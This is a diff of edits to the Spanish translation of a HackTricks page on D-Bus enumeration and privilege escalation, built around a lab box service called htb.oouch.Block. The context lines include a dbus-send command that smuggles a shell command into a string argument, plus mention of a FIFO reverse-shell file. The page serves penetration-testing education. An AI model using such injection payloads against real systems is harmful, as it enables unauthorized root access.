@@ -16,11 +16,11 @@ Otras formas de apoyar a HackTricks:
 
 ## **Enumeración GUI**
 
-D-Bus se utiliza como mediador de comunicaciones entre procesos (IPC) en entornos de escritorio de Ubuntu. En Ubuntu, se observa la operación concurrente de varios buses de mensajes: el bus del sistema, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes en todo el sistema**, y un bus de sesión para cada usuario conectado, exponiendo servicios relevantes solo para ese usuario específico. El enfoque aquí es principalmente en el bus del sistema debido a su asociación con servicios que se ejecutan con privilegios más altos (por ejemplo, root), ya que nuestro objetivo es elevar privilegios. Se destaca que la arquitectura de D-Bus emplea un 'enrutador' por bus de sesión, que es responsable de redirigir los mensajes de los clientes a los servicios apropiados basándose en la dirección especificada por los clientes para el servicio con el que desean comunicarse.
+D-Bus se utiliza como mediador de comunicaciones entre procesos (IPC) en entornos de escritorio de Ubuntu. En Ubuntu, se observa la operación concurrente de varios buses de mensajes: el bus del sistema, utilizado principalmente por **servicios privilegiados para exponer servicios relevantes en todo el sistema**, y un bus de sesión para cada usuario conectado, exponiendo servicios relevantes solo para ese usuario específico. El enfoque aquí es principalmente en el bus del sistema debido a su asociación con servicios que se ejecutan con privilegios más altos (por ejemplo, root), ya que nuestro objetivo es elevar privilegios. Se destaca que la arquitectura de D-Bus emplea un 'enrutador' por bus de sesión, que es responsable de redirigir los mensajes de los clientes a los servicios apropiados según la dirección especificada por los clientes para el servicio con el que desean comunicarse.
 
-Los servicios en D-Bus están definidos por los **objetos** e **interfaces** que exponen. Los objetos se pueden asemejar a instancias de clase en lenguajes de programación orientados a objetos estándar, con cada instancia identificada de manera única por una **ruta de objeto**. Esta ruta, similar a una ruta de sistema de archivos, identifica de manera única cada objeto expuesto por el servicio. Una interfaz clave para fines de investigación es la interfaz **org.freedesktop.DBus.Introspectable**, que presenta un método singular, Introspect. Este método devuelve una representación XML de los métodos admitidos por el objeto, así como señales y propiedades, centrándose aquí en los métodos y omitiendo propiedades y señales.
+Los servicios en D-Bus están definidos por los **objetos** e **interfaces** que exponen. Los objetos se pueden asemejar a instancias de clase en lenguajes de programación orientados a objetos estándar, con cada instancia identificada de manera única por una **ruta de objeto**. Esta ruta, similar a una ruta de sistema de archivos, identifica de manera única cada objeto expuesto por el servicio. Una interfaz clave para fines de investigación es la interfaz **org.freedesktop.DBus.Introspectable**, que presenta un método singular, Introspect. Este método devuelve una representación XML de los métodos admitidos por el objeto, señales y propiedades, centrándose aquí en los métodos y omitiendo propiedades y señales.
 
-Para la comunicación con la interfaz de D-Bus, se emplearon dos herramientas: una herramienta de línea de comandos llamada **gdbus** para invocar fácilmente los métodos expuestos por D-Bus en scripts, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una herramienta GUI basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objetos contenidos en cada servicio.
+Para la comunicación con la interfaz de D-Bus, se emplearon dos herramientas: una herramienta de línea de comandos llamada **gdbus** para invocar fácilmente los métodos expuestos por D-Bus en scripts, y [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), una herramienta GUI basada en Python diseñada para enumerar los servicios disponibles en cada bus y mostrar los objetos contenidos dentro de cada servicio.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -37,9 +37,9 @@ Una característica notable es la visualización del **ID de proceso (pid)** y l
 
 Sin embargo, hay que tener en cuenta que **algunos métodos requieren autenticación** antes de permitirnos invocarlos. Ignoraremos estos métodos, ya que nuestro objetivo es elevar nuestros privilegios sin credenciales en primer lugar.
 
-También hay que tener en cuenta que algunos de los servicios consultan a otro servicio D-Bus llamado org.freedeskto.PolicyKit1 para determinar si un usuario debe poder realizar ciertas acciones o no.
+También hay que tener en cuenta que algunos de los servicios consultan otro servicio de D-Bus llamado org.freedeskto.PolicyKit1 para determinar si un usuario debe poder realizar ciertas acciones o no.
 
-## **Enumeración de la línea de comandos**
+## **Enumeración de Línea de Comandos**
 
 ### Listar Objetos de Servicio
 
@@ -69,7 +69,7 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### Conexiones
 
-[De Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Cuando un proceso establece una conexión a un bus, el bus asigna a la conexión un nombre de bus especial llamado _nombre de conexión único_. Los nombres de bus de este tipo son inmutables, lo que garantiza que no cambiarán mientras exista la conexión, y, lo que es más importante, no se pueden reutilizar durante la vida útil del bus. Esto significa que ninguna otra conexión a ese bus tendrá asignado un nombre de conexión único, incluso si el mismo proceso cierra la conexión al bus y crea una nueva. Los nombres de conexión únicos son fácilmente reconocibles porque comienzan con el carácter de dos puntos, que de otra manera está prohibido.
+[De Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Cuando un proceso establece una conexión a un bus, el bus asigna a la conexión un nombre especial de bus llamado _nombre de conexión único_. Los nombres de bus de este tipo son inmutables, lo que garantiza que no cambiarán mientras exista la conexión, y, lo que es más importante, no se pueden reutilizar durante la vida útil del bus. Esto significa que ninguna otra conexión a ese bus tendrá asignado un nombre de conexión único, incluso si el mismo proceso cierra la conexión al bus y crea una nueva. Los nombres de conexión únicos son fácilmente reconocibles porque comienzan con el carácter de dos puntos, que de otra manera está prohibido.
 
 ### Información del Objeto de Servicio
 
@@ -145,7 +145,7 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 ```
 ### Inspeccionar la Interfaz de un Objeto de Servicio
 
-Observe cómo en este ejemplo se seleccionó la última interfaz descubierta utilizando el parámetro `tree` (_ver sección anterior_):
+Tenga en cuenta cómo en este ejemplo se seleccionó la última interfaz descubierta utilizando el parámetro `tree` (_ver sección anterior_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -165,7 +165,7 @@ org.freedesktop.DBus.Properties     interface -         -            -
 ```
 ### Interfaz de Monitoreo/Captura
 
-Con el suficiente privilegio (simplemente `send_destination` y `receive_sender` no son suficientes) puedes **monitorear una comunicación D-Bus**.
+Con la cantidad suficiente de privilegios (simplemente `send_destination` y `receive_sender` no son suficientes) puedes **monitorear una comunicación D-Bus**.
 
 Para **monitorear** una **comunicación** necesitarás ser **root**. Si aún tienes problemas para ser root, consulta [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) y [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
@@ -264,7 +264,7 @@ En el otro lado de la conexión D-Bus hay un binario compilado en C en ejecució
 
 ### Explotarlo
 
-Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro de él, entre las líneas 91-97, puedes ver cómo se **registran** el **`path del objeto D-Bus`** y el **`nombre de la interfaz`**. Esta información será necesaria para enviar información a la conexión D-Bus:
+Al final de esta página puedes encontrar el **código C completo de la aplicación D-Bus**. Dentro de él, entre las líneas 91-97 puedes encontrar cómo se **registran el `path del objeto D-Bus`** y el **`nombre de la interfaz`**. Esta información será necesaria para enviar información a la conexión D-Bus:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -274,7 +274,7 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-También, en la línea 57 puedes encontrar que **el único método registrado** para esta comunicación D-Bus se llama `Block` (_**Por eso, en la siguiente sección, las cargas útiles se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):
+También, en la línea 57 puedes encontrar que **el único método registrado** para esta comunicación D-Bus se llama `Block`(_**Por eso, en la siguiente sección, las cargas útiles se enviarán al objeto de servicio `htb.oouch.Block`, la interfaz `/htb/oouch/Block` y el nombre del método `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
@@ -295,11 +295,11 @@ bus.close()
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
 * `dbus-send` es una herramienta utilizada para enviar mensajes al "Bus de Mensajes".
-* Bus de Mensajes: Un software utilizado por sistemas para facilitar la comunicación entre aplicaciones. Está relacionado con la Cola de Mensajes (los mensajes se ordenan en secuencia), pero en el Bus de Mensajes los mensajes se envían en un modelo de suscripción y también de forma muy rápida.
+* Bus de Mensajes: Un software utilizado por sistemas para facilitar las comunicaciones entre aplicaciones. Está relacionado con la Cola de Mensajes (los mensajes se ordenan en secuencia), pero en el Bus de Mensajes los mensajes se envían en un modelo de suscripción y también de forma muy rápida.
 * La etiqueta "-system" se utiliza para indicar que es un mensaje del sistema, no un mensaje de sesión (por defecto).
-* La etiqueta "--print-reply" se utiliza para imprimir nuestro mensaje de manera apropiada y recibir cualquier respuesta en un formato legible para humanos.
+* La etiqueta "--print-reply" se utiliza para imprimir nuestro mensaje de forma adecuada y recibir cualquier respuesta en un formato legible para humanos.
 * "--dest=Dbus-Interface-Block" es la dirección de la interfaz Dbus.
-* "--string:" - Tipo de mensaje que queremos enviar a la interfaz. Hay varios formatos para enviar mensajes como double, bytes, booleans, int, objpath. De estos, el "objeto path" es útil cuando queremos enviar la ruta de un archivo a la interfaz Dbus. En este caso, podemos usar un archivo especial (FIFO) para pasar un comando a la interfaz en nombre de un archivo. "string:;" - Esto es para llamar al objeto path nuevamente donde colocamos el archivo de shell inverso FIFO.
+* "--string:" - Tipo de mensaje que queremos enviar a la interfaz. Hay varios formatos para enviar mensajes como double, bytes, booleans, int, objpath. De estos, la "ruta de objeto" es útil cuando queremos enviar la ruta de un archivo a la interfaz Dbus. Podemos usar un archivo especial (FIFO) en este caso para pasar un comando a la interfaz con el nombre de un archivo. "string:;" - Esto es para llamar a la ruta de objeto nuevamente donde colocamos el archivo de shell inverso FIFO.
 
 _Nota que en `htb.oouch.Block.Block`, la primera parte (`htb.oouch.Block`) hace referencia al objeto de servicio y la última parte (`.Block`) hace referencia al nombre del método._
 
@@ -448,18 +448,18 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-# Referencias
+## Referencias
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks AWS)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
